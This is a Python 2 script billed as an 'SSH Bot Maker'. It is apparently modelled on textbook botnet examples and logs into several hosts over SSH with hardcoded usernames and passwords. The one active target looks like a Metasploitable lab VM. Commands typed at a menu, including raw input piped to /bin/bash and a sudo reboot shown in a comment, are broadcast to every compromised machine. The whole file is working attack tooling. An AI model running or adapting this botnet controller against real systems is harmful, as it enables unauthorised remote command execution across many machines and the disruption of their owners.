import pxssh
import sys
import os
from colorama import Fore, Back, Style
from pexpect import pxssh

os.system('clear')

print ""
print ('-'*30+"SSH Bot Maker"+'-'*30)
print  (Fore.GREEN+"")
print "1.List Bot"
print "2.Run Command"
print "3.Bash"
print "4.Exit"

option=raw_input("Enter any option:")



class Client:

	def __init__(self,host,user,password):

		self.host=host
		self.user=user
		self.password=password
		self.session=self.connect()

	def connect(self):
		try:
			s=pxssh.pxssh()
	      		s.login(self.host,self.user,self.password,auto_prompt_reset=False)
			return s
		except Exception,e:
			print e
			print (Fore.RED+"[-]Error connecting")
	
	def send_command(self,cmd):
		self.session.sendline(cmd)
		self.session.prompt()
		return self.session.before
	
def botnetCommand(command):
	for client in botnet:
		output=client.send_command(command)
		print "[*]Output from" + client.host
		print "[+]<<<"+ output

def addclient(host,user,password):
	client=Client(host,user,password)
	botnet.append(client)

def askforcommand():
	run=raw_input(Fore.GREEN+"Enter a command to run:")
	botnetCommand(run)

def bash():
	bash=raw_input(">>>:")
	botnetCommand('echo %s | /bin/bash' %bash)

botnet=[]
#add your bot computers
addclient('192.168.56.101','msfadmin','hacked')
#addclient('127.0.0.1','hiddenbase','hiddenbase')
#addclient('10.0.2.15','killer','Killer99')
#addclient('192.168.0.2','root','test')
#addclient('192.168.0.2','test','test')
#when required a password for a command use the below syntax
#echo <password> |sudo -S <command>
#botnetCommand('echo hacked | sudo -S reboot')


if option =='1':
	n=len(botnet)
	for i in range(0,n):
		print str(botnet[i])
		i=i+1

elif option == '2':
	while True:	
		askforcommand()

elif option == '3':
	while True:
		bash()

else :
	sys.exit()

